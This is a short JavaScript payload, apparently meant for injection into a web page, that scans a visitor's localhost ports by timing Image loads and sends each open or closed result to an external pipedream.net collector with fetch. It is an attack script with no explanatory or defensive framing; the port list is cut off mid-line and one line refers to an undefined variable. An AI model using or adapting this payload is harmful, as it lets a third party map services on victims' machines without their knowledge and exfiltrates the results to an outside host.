var portsCheck = function(callback, target, port, timeout) {

    var timeout = (timeout == null) ? 100 : timeout;
    var img = new Image();

    img.onerror = function() {
        if (!img) return;
        img = undefined;
        callback(target, port, 'open');
    };

    img.onload = img.onerror;
    img.src = 'http://' + target + ':' + port;

    setTimeout(function() {
        if (!img) return;
        img = undefined;
        callback(target, port, 'closed');
    }, timeout);
};

var ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 29, 37, 42, 43, 49, 53, 69, 70, 79, 80, 103, 108, 109, 110, 115, 118, 119, 137, 139, 143, 150, 156, 161, 179, 190, 194,>
for (var a = 0; a < ports.length; a++)
    portsCheck(function(target, port, status) {

        fetch("https://enjvgl53rrbci.x.pipedream.net/?"+status+"="+port)
        element.text(status);
    }, "127.0.0.1", ports[a], 1000);
